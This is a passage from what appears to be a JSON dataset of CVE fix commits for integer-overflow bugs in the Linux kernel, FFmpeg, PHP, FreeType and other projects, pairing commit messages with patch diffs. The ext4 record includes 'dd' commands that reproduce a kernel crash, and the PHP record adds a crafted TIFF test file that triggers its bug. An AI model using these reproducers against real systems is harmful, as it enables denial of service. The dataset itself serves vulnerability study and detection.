hit BUG_ON(next == lblock)\nin ext4_ext_put_gap_in_cache() while creating a sparse file in extent\nformat and fill the tail of file up to its end. We will hit the BUG_ON\nwhen we write the last block (2^32-1) into the sparse file.\n\nThe root cause of the problem lies in the fact that we specifically set\ns_maxbytes so that block at s_maxbytes fit into on-disk extent format,\nwhich is 32 bit long. However, we are not storing start and end block\nnumber, but rather start block number and length in blocks. It means\nthat in order to cover extent from 0 to EXT_MAX_BLOCK we need\nEXT_MAX_BLOCK+1 to fit into len (because we counting block 0 as well) -\nand it does not.\n\nThe only way to fix it without changing the meaning of the struct\next4_extent members is, as Kazuya Mio suggested, to lower s_maxbytes\nby one fs block so we can cover the whole extent we can get by the\non-disk extent format.\n\nAlso in many places EXT_MAX_BLOCK is used as length instead of maximum\nlogical block number as the name suggests, it is all a bit messy. So\nthis commit renames it to EXT_MAX_BLOCKS and change its usage in some\nplaces to actually be maximum number of blocks in the extent.\n\nThe bug which this commit fixes can be reproduced as follows:\n\n dd if=\/dev\/zero of=\/mnt\/mp1\/file bs=<blocksize> count=1 seek=$((2**32-2))\n sync\n dd if=\/dev\/zero of=\/mnt\/mp1\/file bs=<blocksize> count=1 seek=$((2**32-1))\n\nReported-by: Kazuya Mio <k-mio@sx.jp.nec.com>\nSigned-off-by: Lukas Czerner <lczerner@redhat.com>\nSigned-off-by: \"Theodore Ts'o\" <tytso@mit.edu>\n---\n fs\/ext4\/ext4_extents.h |  7 +++++--\n fs\/ext4\/extents.c      | 34 +++++++++++++++++-----------------\n fs\/ext4\/move_extent.c  | 10 +++++-----\n fs\/ext4\/super.c        | 15 ++++++++++++---\n 4 files changed, 39 insertions(+), 27 deletions(-)\n\n","diff_code":"diff --git a\/fs\/ext4\/ext4_extents.h b\/fs\/ext4\/ext4_extents.h\nindex 2e29abb30f76..476414644387 100644\n--- a\/fs\/ext4\/ext4_extents.h\n+++ b\/fs\/ext4\/ext4_extents.h\n@@ -133,8 +133,11 @@ typedef int (*ext_prepare_callback)(struct inode *, struct ext4_ext_path *,\n #define EXT_BREAK      1\n #define EXT_REPEAT     2\n \n-\/* Maximum logical block in a file; ext4_extent's ee_block is __le32 *\/\n-#define EXT_MAX_BLOCK\t0xffffffff\n+\/*\n+ * Maximum number of logical blocks in a file; ext4_extent's ee_block is\n+ * __le32.\n+ *\/\n+#define EXT_MAX_BLOCKS\t0xffffffff\n \n \/*\n  * EXT_INIT_MAX_LEN is the maximum number of blocks we can have in an\ndiff --git a\/fs\/ext4\/extents.c b\/fs\/ext4\/extents.c\nindex 5199bac7fc62..41575704600a 100644\n--- a\/fs\/ext4\/extents.c\n+++ b\/fs\/ext4\/extents.c\n@@ -1408,7 +1408,7 @@ got_index:\n \n \/*\n  * ext4_ext_next_allocated_block:\n- * returns allocated block in subsequent extent or EXT_MAX_BLOCK.\n+ * returns allocated block in subsequent extent or EXT_MAX_BLOCKS.\n  * NOTE: it considers block number from index entry as\n  * allocated block. Thus, index entries have to be consistent\n  * with leaves.\n@@ -1422,7 +1422,7 @@ ext4_ext_next_allocated_block(struct ext4_ext_path *path)\n \tdepth = path->p_depth;\n \n \tif (depth == 0 && path->p_ext == NULL)\n-\t\treturn EXT_MAX_BLOCK;\n+\t\treturn EXT_MAX_BLOCKS;\n \n \twhile (depth >= 0) {\n \t\tif (depth == path->p_depth) {\n@@ -1439,12 +1439,12 @@ ext4_ext_next_allocated_block(struct ext4_ext_path *path)\n \t\tdepth--;\n \t}\n \n-\treturn EXT_MAX_BLOCK;\n+\treturn EXT_MAX_BLOCKS;\n }\n \n \/*\n  * ext4_ext_next_leaf_block:\n- * returns first allocated block from next leaf or EXT_MAX_BLOCK\n+ * returns first allocated block from next leaf or EXT_MAX_BLOCKS\n  *\/\n static ext4_lblk_t ext4_ext_next_leaf_block(struct inode *inode,\n \t\t\t\t\tstruct ext4_ext_path *path)\n@@ -1456,7 +1456,7 @@ static ext4_lblk_t ext4_ext_next_leaf_block(struct inode *inode,\n \n \t\/* zero-tree has no leaf blocks at all *\/\n \tif (depth == 0)\n-\t\treturn EXT_MAX_BLOCK;\n+\t\treturn EXT_MAX_BLOCKS;\n \n \t\/* go to index block *\/\n \tdepth--;\n@@ -1469,7 +1469,7 @@ static ext4_lblk_t ext4_ext_next_leaf_block(struct inode *inode,\n \t\tdepth--;\n \t}\n \n-\treturn EXT_MAX_BLOCK;\n+\treturn EXT_MAX_BLOCKS;\n }\n \n \/*\n@@ -1677,13 +1677,13 @@ static unsigned int ext4_ext_check_overlap(struct inode *inode,\n \t *\/\n \tif (b2 < b1) {\n \t\tb2 = ext4_ext_next_allocated_block(path);\n-\t\tif (b2 == EXT_MAX_BLOCK)\n+\t\tif (b2 == EXT_MAX_BLOCKS)\n \t\t\tgoto out;\n \t}\n \n \t\/* check for wrap through zero on extent logical start block*\/\n \tif (b1 + len1 < b1) {\n-\t\tlen1 = EXT_MAX_BLOCK - b1;\n+\t\tlen1 = EXT_MAX_BLOCKS - b1;\n \t\tnewext->ee_len = cpu_to_le16(len1);\n \t\tret = 1;\n \t}\n@@ -1767,7 +1767,7 @@ repeat:\n \tfex = EXT_LAST_EXTENT(eh);\n \tnext = ext4_ext_next_leaf_block(inode, path);\n \tif (le32_to_cpu(newext->ee_block) > le32_to_cpu(fex->ee_block)\n-\t    && next != EXT_MAX_BLOCK) {\n+\t    && next != EXT_MAX_BLOCKS) {\n \t\text_debug(\"next leaf block - %d\\n\", next);\n \t\tBUG_ON(npath != NULL);\n \t\tnpath = ext4_ext_find_extent(inode, next, NULL);\n@@ -1887,7 +1887,7 @@ static int ext4_ext_walk_space(struct inode *inode, ext4_lblk_t block,\n \tBUG_ON(func == NULL);\n \tBUG_ON(inode == NULL);\n \n-\twhile (block < last && block != EXT_MAX_BLOCK) {\n+\twhile (block < last && block != EXT_MAX_BLOCKS) {\n \t\tnum = last - block;\n \t\t\/* find extent for this block *\/\n \t\tdown_read(&EXT4_I(inode)->i_data_sem);\n@@ -2020,7 +2020,7 @@ ext4_ext_put_gap_in_cache(struct inode *inode, struct ext4_ext_path *path,\n \tif (ex == NULL) {\n \t\t\/* there is no extent yet, so gap is [0;-] *\/\n \t\tlblock = 0;\n-\t\tlen = EXT_MAX_BLOCK;\n+\t\tlen = EXT_MAX_BLOCKS;\n \t\text_debug(\"cache gap(whole file):\");\n \t} else if (block < le32_to_cpu(ex->ee_block)) {\n \t\tlblock = block;\n@@ -2350,7 +2350,7 @@ ext4_ext_rm_leaf(handle_t *handle, struct inode *inode,\n \t\t\t * never happen because at least one of the end points\n \t\t\t * needs to be on the edge of the extent.\n \t\t\t *\/\n-\t\t\tif (end == EXT_MAX_BLOCK) {\n+\t\t\tif (end == EXT_MAX_BLOCKS - 1) {\n \t\t\t\text_debug(\"  bad truncate %u:%u\\n\",\n \t\t\t\t\t\tstart, end);\n \t\t\t\tblock = 0;\n@@ -2398,7 +2398,7 @@ ext4_ext_rm_leaf(handle_t *handle, struct inode *inode,\n \t\t\t * If this is a truncate, this condition\n \t\t\t * should never happen\n \t\t\t *\/\n-\t\t\tif (end == EXT_MAX_BLOCK) {\n+\t\t\tif (end == EXT_MAX_BLOCKS - 1) {\n \t\t\t\text_debug(\"  bad truncate %u:%u\\n\",\n \t\t\t\t\tstart, end);\n \t\t\t\terr = -EIO;\n@@ -2478,7 +2478,7 @@ ext4_ext_rm_leaf(handle_t *handle, struct inode *inode,\n \t\t * we need to remove it from the leaf\n \t\t *\/\n \t\tif (num == 0) {\n-\t\t\tif (end != EXT_MAX_BLOCK) {\n+\t\t\tif (end != EXT_MAX_BLOCKS - 1) {\n \t\t\t\t\/*\n \t\t\t\t * For hole punching, we need to scoot all the\n \t\t\t\t * extents up when an extent is removed so that\n@@ -3699,7 +3699,7 @@ void ext4_ext_truncate(struct inode *inode)\n \n \tlast_block = (inode->i_size + sb->s_blocksize - 1)\n \t\t\t>> EXT4_BLOCK_SIZE_BITS(sb);\n-\terr = ext4_ext_remove_space(inode, last_block, EXT_MAX_BLOCK);\n+\terr = ext4_ext_remove_space(inode, last_block, EXT_MAX_BLOCKS - 1);\n \n \t\/* In a multi-transaction truncate, we only make the final\n \t * transaction synchronous.\n@@ -4347,8 +4347,8 @@ int ext4_fiemap(struct inode *inode, struct fiemap_extent_info *fieinfo,\n \n \t\tstart_blk = start >> inode->i_sb->s_blocksize_bits;\n \t\tlast_blk = (start + len - 1) >> inode->i_sb->s_blocksize_bits;\n-\t\tif (last_blk >= EXT_MAX_BLOCK)\n-\t\t\tlast_blk = EXT_MAX_BLOCK-1;\n+\t\tif (last_blk >= EXT_MAX_BLOCKS)\n+\t\t\tlast_blk = EXT_MAX_BLOCKS-1;\n \t\tlen_blks = ((ext4_lblk_t) last_blk) - start_blk + 1;\n \n \t\t\/*\ndiff --git a\/fs\/ext4\/move_extent.c b\/fs\/ext4\/move_extent.c\nindex 2b8304bf3c50..f57455a1b1b2 100644\n--- a\/fs\/ext4\/move_extent.c\n+++ b\/fs\/ext4\/move_extent.c\n@@ -1002,12 +1002,12 @@ mext_check_arguments(struct inode *orig_inode,\n \t\treturn -EINVAL;\n \t}\n \n-\tif ((orig_start > EXT_MAX_BLOCK) ||\n-\t    (donor_start > EXT_MAX_BLOCK) ||\n-\t    (*len > EXT_MAX_BLOCK) ||\n-\t    (orig_start + *len > EXT_MAX_BLOCK))  {\n+\tif ((orig_start >= EXT_MAX_BLOCKS) ||\n+\t    (donor_start >= EXT_MAX_BLOCKS) ||\n+\t    (*len > EXT_MAX_BLOCKS) ||\n+\t    (orig_start + *len >= EXT_MAX_BLOCKS))  {\n \t\text4_debug(\"ext4 move extent: Can't handle over [%u] blocks \"\n-\t\t\t\"[ino:orig %lu, donor %lu]\\n\", EXT_MAX_BLOCK,\n+\t\t\t\"[ino:orig %lu, donor %lu]\\n\", EXT_MAX_BLOCKS,\n \t\t\torig_inode->i_ino, donor_inode->i_ino);\n \t\treturn -EINVAL;\n \t}\ndiff --git a\/fs\/ext4\/super.c b\/fs\/ext4\/super.c\nindex cc5c157aa11d..9ea71aa864b3 100644\n--- a\/fs\/ext4\/super.c\n+++ b\/fs\/ext4\/super.c\n@@ -2243,6 +2243,12 @@ static void ext4_orphan_cleanup(struct super_block *sb,\n  * in the vfs.  ext4 inode has 48 bits of i_block in fsblock units,\n  * so that won't be a limiting factor.\n  *\n+ * However there is other limiting factor. We do store extents in the form\n+ * of starting block and length, hence the resulting length of the extent\n+ * covering maximum file size must fit into on-disk format containers as\n+ * well. Given that length is always by 1 unit bigger than max unit (because\n+ * we count 0 as well) we have to lower the s_maxbytes by one fs block.\n+ *\n  * Note, this does *not* consider any metadata overhead for vfs i_blocks.\n  *\/\n static loff_t ext4_max_size(int blkbits, int has_huge_files)\n@@ -2264,10 +2270,13 @@ static loff_t ext4_max_size(int blkbits, int has_huge_files)\n \t\tupper_limit <<= blkbits;\n \t}\n \n-\t\/* 32-bit extent-start container, ee_block *\/\n-\tres = 1LL << 32;\n+\t\/*\n+\t * 32-bit extent-start container, ee_block. We lower the maxbytes\n+\t * by one fs block, so ee_len can cover the extent of maximum file\n+\t * size\n+\t *\/\n+\tres = (1LL << 32) - 1;\n \tres <<= blkbits;\n-\tres -= 1;\n \n \t\/* Sanity check against vm- & vfs- imposed limits *\/\n \tif (res > upper_limit)\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"stoth68000","repo":"media-tree","source":"cve"},{"CVE_ID":"CVE-2015-8875","CWE_ID":"189","category":"security","commit_id":"dbfe8f70471864818bf458a39c8a99640895bd22","commit_message":"From dbfe8f70471864818bf458a39c8a99640895bd22 Mon Sep 17 00:00:00 2001\nFrom: Mike Gorse <mgorse@suse.com>\nDate: Tue, 6 Oct 2015 11:46:24 -0500\nSubject: [PATCH] pixops: use gint64 in more places to avoid overflow when\n shifting\n\n---\n gdk-pixbuf\/pixops\/pixops.c | 34 +++++++++++++++++-----------------\n 1 file changed, 17 insertions(+), 17 deletions(-)\n\n","diff_code":"diff --git a\/gdk-pixbuf\/pixops\/pixops.c b\/gdk-pixbuf\/pixops\/pixops.c\nindex b0abecd1b..6a4a09629 100644\n--- a\/gdk-pixbuf\/pixops\/pixops.c\n+++ b\/gdk-pixbuf\/pixops\/pixops.c\n@@ -354,11 +354,11 @@ pixops_composite_nearest (guchar        *dest_buf,\n \t\t\t  double         scale_y,\n \t\t\t  int            overall_alpha)\n {\n-  int i;\n-  int x;\n-  int x_step = (1 << SCALE_SHIFT) \/ scale_x;\n-  int y_step = (1 << SCALE_SHIFT) \/ scale_y;\n-  int xmax, xstart, xstop, x_pos, y_pos;\n+  gint64 i;\n+  gint64 x;\n+  gint64 x_step = (1 << SCALE_SHIFT) \/ scale_x;\n+  gint64 y_step = (1 << SCALE_SHIFT) \/ scale_y;\n+  gint64 xmax, xstart, xstop, x_pos, y_pos;\n   const guchar *p;\n   unsigned int  a0;\n \n@@ -524,13 +524,13 @@ pixops_composite_color_nearest (guchar        *dest_buf,\n \t\t\t\tguint32        color1,\n \t\t\t\tguint32        color2)\n {\n-  int i, j;\n-  int x;\n-  int x_step = (1 << SCALE_SHIFT) \/ scale_x;\n-  int y_step = (1 << SCALE_SHIFT) \/ scale_y;\n+  gint64 i, j;\n+  gint64 x;\n+  gint64 x_step = (1 << SCALE_SHIFT) \/ scale_x;\n+  gint64 y_step = (1 << SCALE_SHIFT) \/ scale_y;\n   int r1, g1, b1, r2, g2, b2;\n   int check_shift = get_check_shift (check_size);\n-  int xmax, xstart, xstop, x_pos, y_pos;\n+  gint64 xmax, xstart, xstop, x_pos, y_pos;\n   const guchar *p;\n   unsigned int  a0;\n \n@@ -1338,20 +1338,20 @@ pixops_process (guchar         *dest_buf,\n \t\tPixopsLineFunc  line_func,\n \t\tPixopsPixelFunc pixel_func)\n {\n-  int i, j;\n-  int x, y;\t\t\t\/* X and Y position in source (fixed_point) *\/\n+  gint64 i, j;\n+  gint64 x, y;\t\t\t\/* X and Y position in source (fixed_point) *\/\n \n   guchar **line_bufs;\n   int *filter_weights;\n \n-  int x_step;\n-  int y_step;\n+  gint64 x_step;\n+  gint64 y_step;\n \n   int check_shift;\n-  int scaled_x_offset;\n+  gint64 scaled_x_offset;\n \n-  int run_end_x;\n-  int run_end_index;\n+  gint64 run_end_x;\n+  gint64 run_end_index;\n \n   x_step = (1 << SCALE_SHIFT) \/ scale_x; \/* X step in source (fixed point) *\/\n   y_step = (1 << SCALE_SHIFT) \/ scale_y; \/* Y step in source (fixed point) *\/\n-- \n2.21.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2010-2478","CWE_ID":"189","category":"security","commit_id":"db048b69037e7fa6a7d9e95a1271a50dc08ae233","commit_message":"From db048b69037e7fa6a7d9e95a1271a50dc08ae233 Mon Sep 17 00:00:00 2001\nFrom: Ben Hutchings <bhutchings@solarflare.com>\nDate: Mon, 28 Jun 2010 08:44:07 +0000\nSubject: ethtool: Fix potential kernel buffer overflow in ETHTOOL_GRXCLSRLALL\n\nOn a 32-bit machine, info.rule_cnt >= 0x40000000 leads to integer\noverflow and the buffer may be smaller than needed.  Since\nETHTOOL_GRXCLSRLALL is unprivileged, this can presumably be used for at\nleast denial of service.\n\nSigned-off-by: Ben Hutchings <bhutchings@solarflare.com>\nCc: stable@kernel.org\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n net\/core\/ethtool.c | 5 +++--\n 1 file changed, 3 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/net\/core\/ethtool.c b\/net\/core\/ethtool.c\nindex a0f4964033d2..a3a7e9a48dff 100644\n--- a\/net\/core\/ethtool.c\n+++ b\/net\/core\/ethtool.c\n@@ -347,8 +347,9 @@ static noinline_for_stack int ethtool_get_rxnfc(struct net_device *dev,\n \n \tif (info.cmd == ETHTOOL_GRXCLSRLALL) {\n \t\tif (info.rule_cnt > 0) {\n-\t\t\trule_buf = kmalloc(info.rule_cnt * sizeof(u32),\n-\t\t\t\t\t   GFP_USER);\n+\t\t\tif (info.rule_cnt <= KMALLOC_MAX_SIZE \/ sizeof(u32))\n+\t\t\t\trule_buf = kmalloc(info.rule_cnt * sizeof(u32),\n+\t\t\t\t\t\t   GFP_USER);\n \t\t\tif (!rule_buf)\n \t\t\t\treturn -ENOMEM;\n \t\t}\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"mjg59","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2010-2537","CWE_ID":"189","category":"security","commit_id":"2ebc3464781ad24474abcbd2274e6254689853b5","commit_message":"From 2ebc3464781ad24474abcbd2274e6254689853b5 Mon Sep 17 00:00:00 2001\nFrom: Dan Rosenberg <dan.j.rosenberg@gmail.com>\nDate: Mon, 19 Jul 2010 16:58:20 -0400\nSubject: Btrfs: fix checks in BTRFS_IOC_CLONE_RANGE\n\n1.  The BTRFS_IOC_CLONE and BTRFS_IOC_CLONE_RANGE ioctls should check\nwhether the donor file is append-only before writing to it.\n\n2.  The BTRFS_IOC_CLONE_RANGE ioctl appears to have an integer\noverflow that allows a user to specify an out-of-bounds range to copy\nfrom the source file (if off + len wraps around).  I haven't been able\nto successfully exploit this, but I'd imagine that a clever attacker\ncould use this to read things he shouldn't.  Even if it's not\nexploitable, it couldn't hurt to be safe.\n\nSigned-off-by: Dan Rosenberg <dan.j.rosenberg@gmail.com>\ncc: stable@kernel.org\nSigned-off-by: Chris Mason <chris.mason@oracle.com>\n---\n fs\/btrfs\/ioctl.c | 4 ++--\n 1 file changed, 2 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/fs\/btrfs\/ioctl.c b\/fs\/btrfs\/ioctl.c\nindex 2a8b3a7568ad..9254b3d58dbe 100644\n--- a\/fs\/btrfs\/ioctl.c\n+++ b\/fs\/btrfs\/ioctl.c\n@@ -1458,7 +1458,7 @@ static noinline long btrfs_ioctl_clone(struct file *file, unsigned long srcfd,\n \t *\/\n \n \t\/* the destination must be opened for writing *\/\n-\tif (!(file->f_mode & FMODE_WRITE))\n+\tif (!(file->f_mode & FMODE_WRITE) || (file->f_flags & O_APPEND))\n \t\treturn -EINVAL;\n \n \tret = mnt_want_write(file->f_path.mnt);\n@@ -1511,7 +1511,7 @@ static noinline long btrfs_ioctl_clone(struct file *file, unsigned long srcfd,\n \n \t\/* determine range to clone *\/\n \tret = -EINVAL;\n-\tif (off >= src->i_size || off + len > src->i_size)\n+\tif (off + len > src->i_size || off + len < off)\n \t\tgoto out_unlock;\n \tif (len == 0)\n \t\tolen = len = src->i_size - off;\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2011-4031","CWE_ID":"189","category":"security","commit_id":"c2a2ad133eb9d42361804a568dee336992349a5e","commit_message":"From c2a2ad133eb9d42361804a568dee336992349a5e Mon Sep 17 00:00:00 2001\nFrom: Michael Niedermayer <michaelni@gmx.at>\nDate: Wed, 7 Sep 2011 14:12:42 +0200\nSubject: [PATCH] rtp: Fix integer underflow that could allow remote code\n execution.\n\nFixes MSVR-11-0088\nCredit:  Jeong Wook Oh of Microsoft and Microsoft Vulnerability Research (MSVR)\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>\n(cherry picked from commit ba9a7e0d71bd34f8b89ae99322b62a310be163a6)\n---\n libavformat\/rtpdec_asf.c | 2 ++\n 1 file changed, 2 insertions(+)\n\n","diff_code":"diff --git a\/libavformat\/rtpdec_asf.c b\/libavformat\/rtpdec_asf.c\nindex 4f776453d7..384aeb24f3 100644\n--- a\/libavformat\/rtpdec_asf.c\n+++ b\/libavformat\/rtpdec_asf.c\n@@ -235,6 +235,8 @@ static int asfrtp_parse_packet(AVFormatContext *s, PayloadContext *asf,\n                 int prev_len = out_len;\n                 out_len += cur_len;\n                 asf->buf = av_realloc(asf->buf, out_len);\n+                if(!asf->buf || FFMIN(cur_len, len - off)<0)\n+                    return -1;\n                 memcpy(asf->buf + prev_len, buf + off,\n                        FFMIN(cur_len, len - off));\n                 avio_skip(pb, cur_len);\n-- \n2.11.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2012-0849","CWE_ID":"189","category":"security","commit_id":"1f99939a6361e2e6d6788494dd7c682b051c6c34","commit_message":"From 1f99939a6361e2e6d6788494dd7c682b051c6c34 Mon Sep 17 00:00:00 2001\nFrom: Michael Niedermayer <michaelni@gmx.at>\nDate: Fri, 16 Dec 2011 04:16:01 +0100\nSubject: [PATCH] j2kdec: Fix integer overflow leading to a segfault Fixes\n Ticket776 Bug found by: Diana Elena Muscalu\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>\n---\n libavcodec\/j2k_dwt.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/libavcodec\/j2k_dwt.c b\/libavcodec\/j2k_dwt.c\nindex ab7a1ab757..48aa33735e 100644\n--- a\/libavcodec\/j2k_dwt.c\n+++ b\/libavcodec\/j2k_dwt.c\n@@ -321,7 +321,7 @@ int ff_j2k_dwt_init(DWTContext *s, uint16_t border[2][2], int decomp_levels, int\n     int i, j, lev = decomp_levels, maxlen,\n         b[2][2];\n \n-    if (decomp_levels >= FF_DWT_MAX_DECLVLS)\n+    if ((unsigned)decomp_levels >= FF_DWT_MAX_DECLVLS)\n         return AVERROR_INVALIDDATA;\n     s->ndeclevels = decomp_levels;\n     s->type = type;\n-- \n2.11.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2016-10158","CWE_ID":"189","category":"security","commit_id":"1cda0d7c2ffb62d8331c64e703131d9cabdc03ea","commit_message":"From 1cda0d7c2ffb62d8331c64e703131d9cabdc03ea Mon Sep 17 00:00:00 2001\nFrom: Stanislav Malyshev <stas@php.net>\nDate: Sat, 31 Dec 2016 19:31:49 -0800\nSubject: [PATCH] Fix bug #73737 FPE when parsing a tag format\n\n---\n ext\/exif\/exif.c              |   2 +-\n ext\/exif\/tests\/bug73737.phpt |  12 ++++++++++++\n ext\/exif\/tests\/bug73737.tiff | Bin 0 -> 48 bytes\n 3 files changed, 13 insertions(+), 1 deletion(-)\n create mode 100644 ext\/exif\/tests\/bug73737.phpt\n create mode 100644 ext\/exif\/tests\/bug73737.tiff\n\n","diff_code":"diff --git a\/ext\/exif\/exif.c b\/ext\/exif\/exif.c\nindex 8b0e34c10dc8..83daee6f54f5 100644\n--- a\/ext\/exif\/exif.c\n+++ b\/ext\/exif\/exif.c\n@@ -1303,7 +1303,7 @@ static size_t exif_convert_any_to_int(void *value, int format, int motorola_inte\n \t\t\tif (s_den == 0) {\n \t\t\t\treturn 0;\n \t\t\t} else {\n-\t\t\t\treturn php_ifd_get32s(value, motorola_intel) \/ s_den;\n+\t\t\t\treturn (size_t)((double)php_ifd_get32s(value, motorola_intel) \/ s_den);\n \t\t\t}\n \n \t\tcase TAG_FMT_SSHORT:    return php_ifd_get16u(value, motorola_intel);\ndiff --git a\/ext\/exif\/tests\/bug73737.phpt b\/ext\/exif\/tests\/bug73737.phpt\nnew file mode 100644\nindex 000000000000..21eaf80585bc\n--- \/dev\/null\n+++ b\/ext\/exif\/tests\/bug73737.phpt\n@@ -0,0 +1,12 @@\n+--TEST--\n+Bug #73737 (Crash when parsing a tag format)\n+--SKIPIF--\n+<?php if (!extension_loaded('exif')) print 'skip exif extension not available';?>\n+--FILE--\n+<?php\n+\t$exif = exif_thumbnail(__DIR__ . '\/bug73737.tiff');\n+\tvar_dump($exif);\n+?>\n+--EXPECTF--\n+Warning: exif_thumbnail(bug73737.tiff): Error in TIFF: filesize(x0030) less than start of IFD dir(x10102) in %s line %d\n+bool(false)\ndiff --git a\/ext\/exif\/tests\/bug73737.tiff b\/ext\/exif\/tests\/bug73737.tiff\nnew file mode 100644\nindex 0000000000000000000000000000000000000000..2cb036fc4730502a3e8041ab24ab12a2ad0b0327\nGIT binary patch\nliteral 48\nocmebEWzb?^VBlb2Wb|TS2C_gv49H_(-~urlfcQTUfY=}a0A>IMx&QzG\n\nliteral 0\nHcmV?d00001\n\n","owner":"php","repo":"php-src","source":"cve"},{"CVE_ID":"CVE-2012-2673","CWE_ID":"189","category":"security","commit_id":"e10c1eb9908c2774c16b3148b30d2f3823d66a9a","commit_message":"From e10c1eb9908c2774c16b3148b30d2f3823d66a9a Mon Sep 17 00:00:00 2001\nFrom: Xi Wang <xi.wang@gmail.com>\nDate: Thu, 15 Mar 2012 04:46:49 +0800\nSubject: [PATCH] Fix calloc() overflow\n\n* malloc.c (calloc): Check multiplication overflow in calloc(),\nassuming REDIRECT_MALLOC.\n---\n malloc.c | 5 +++++\n 1 file changed, 5 insertions(+)\n\n","diff_code":"diff --git a\/malloc.c b\/malloc.c\nindex da68f133..cc0cc001 100644\n--- a\/malloc.c\n+++ b\/malloc.c\n@@ -372,8 +372,13 @@ void * malloc(size_t lb)\n   }\n #endif \/* GC_LINUX_THREADS *\/\n \n+#ifndef SIZE_MAX\n+#define SIZE_MAX (~(size_t)0)\n+#endif\n void * calloc(size_t n, size_t lb)\n {\n+    if (lb && n > SIZE_MAX \/ lb)\n+      return NULL;\n #   if defined(GC_LINUX_THREADS) \/* && !defined(USE_PROC_FOR_LIBRARIES) *\/\n         \/* libpthread allocated some memory that is only pointed to by  *\/\n         \/* mmapped thread stacks.  Make sure it's not collectable.      *\/\n","owner":"ivmai","repo":"bdwgc","source":"cve"},{"CVE_ID":"CVE-2011-2496","CWE_ID":"189","category":"security","commit_id":"982134ba62618c2d69fbbbd166d0a11ee3b7e3d8","commit_message":"From 982134ba62618c2d69fbbbd166d0a11ee3b7e3d8 Mon Sep 17 00:00:00 2001\nFrom: Linus Torvalds <torvalds@linux-foundation.org>\nDate: Thu, 7 Apr 2011 07:35:50 -0700\nSubject: [PATCH] mm: avoid wrapping vm_pgoff in mremap()\n\nThe normal mmap paths all avoid creating a mapping where the pgoff\ninside the mapping could wrap around due to overflow.  However, an\nexpanding mremap() can take such a non-wrapping mapping and make it\nbigger and cause a wrapping condition.\n\nNoticed by Robert Swiecki when running a system call fuzzer, where it\ncaused a BUG_ON() due to terminally confusing the vma_prio_tree code.  A\nvma dumping patch by Hugh then pinpointed the crazy wrapped case.\n\nReported-and-tested-by: Robert Swiecki <robert@swiecki.net>\nAcked-by: Hugh Dickins <hughd@google.com>\nCc: stable@kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n mm\/mremap.c | 11 +++++++++--\n 1 file changed, 9 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/mm\/mremap.c b\/mm\/mremap.c\nindex 1de98d492ddcd..a7c1f9f9b9415 100644\n--- a\/mm\/mremap.c\n+++ b\/mm\/mremap.c\n@@ -277,9 +277,16 @@ static struct vm_area_struct *vma_to_resize(unsigned long addr,\n \tif (old_len > vma->vm_end - addr)\n \t\tgoto Efault;\n \n-\tif (vma->vm_flags & (VM_DONTEXPAND | VM_PFNMAP)) {\n-\t\tif (new_len > old_len)\n+\t\/* Need to be careful about a growing mapping *\/\n+\tif (new_len > old_len) {\n+\t\tunsigned long pgoff;\n+\n+\t\tif (vma->vm_flags & (VM_DONTEXPAND | VM_PFNMAP))\n \t\t\tgoto Efault;\n+\t\tpgoff = (addr - vma->vm_start) >> PAGE_SHIFT;\n+\t\tpgoff += vma->vm_pgoff;\n+\t\tif (pgoff + (new_len >> PAGE_SHIFT) < pgoff)\n+\t\t\tgoto Einval;\n \t}\n \n \tif (vma->vm_flags & VM_LOCKED) {\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2010-2500","CWE_ID":"189","category":"security","commit_id":"6305b869d86ff415a33576df6d43729673c66eee","commit_message":"From 6305b869d86ff415a33576df6d43729673c66eee Mon Sep 17 00:00:00 2001\nFrom: Werner Lemberg <wl@gnu.org>\nDate: Wed, 30 Jun 2010 18:24:33 +0200\nSubject: Fix Savannah bug #30263.\n\n* src\/smooth\/ftgrays.c (gray_render_span): Use cast to `unsigned\nint' to avoid integer overflow.\n\n* src\/smooth\/ftsmooth.c (ft_smooth_render_generic): Use smaller\nthreshold values for `width' and `height'.  This is not directly\nrelated to the bug fix but makes sense anyway.\n---\n ChangeLog             | 11 +++++++++++\n src\/smooth\/ftgrays.c  |  2 +-\n src\/smooth\/ftsmooth.c |  4 ++--\n 3 files changed, 14 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/ChangeLog b\/ChangeLog\nindex 948c563..3bfd52c 100644\n--- a\/ChangeLog\n+++ b\/ChangeLog\n@@ -1,3 +1,14 @@\n+2010-06-30  Werner Lemberg  <wl@gnu.org>\n+\n+\tFix Savannah bug #30263.\n+\n+\t* src\/smooth\/ftgrays.c (gray_render_span): Use cast to `unsigned\n+\tint' to avoid integer overflow.\n+\n+\t* src\/smooth\/ftsmooth.c (ft_smooth_render_generic): Use smaller\n+\tthreshold values for `width' and `height'.  This is not directly\n+\trelated to the bug fix but makes sense anyway.\n+\n 2010-06-30  Alexei Podtelezhnikov  <apodtele@gmail.com>\n \n \tMinor optimizations by avoiding divisions.\ndiff --git a\/src\/smooth\/ftgrays.c b\/src\/smooth\/ftgrays.c\nindex 3c2051a..da530f3 100644\n--- a\/src\/smooth\/ftgrays.c\n+++ b\/src\/smooth\/ftgrays.c\n@@ -1186,7 +1186,7 @@\n     \/* first of all, compute the scanline offset *\/\n     p = (unsigned char*)map->buffer - y * map->pitch;\n     if ( map->pitch >= 0 )\n-      p += ( map->rows - 1 ) * map->pitch;\n+      p += (unsigned)( ( map->rows - 1 ) * map->pitch );\n \n     for ( ; count > 0; count--, spans++ )\n     {\ndiff --git a\/src\/smooth\/ftsmooth.c b\/src\/smooth\/ftsmooth.c\nindex eed6353..7d16b94 100644\n--- 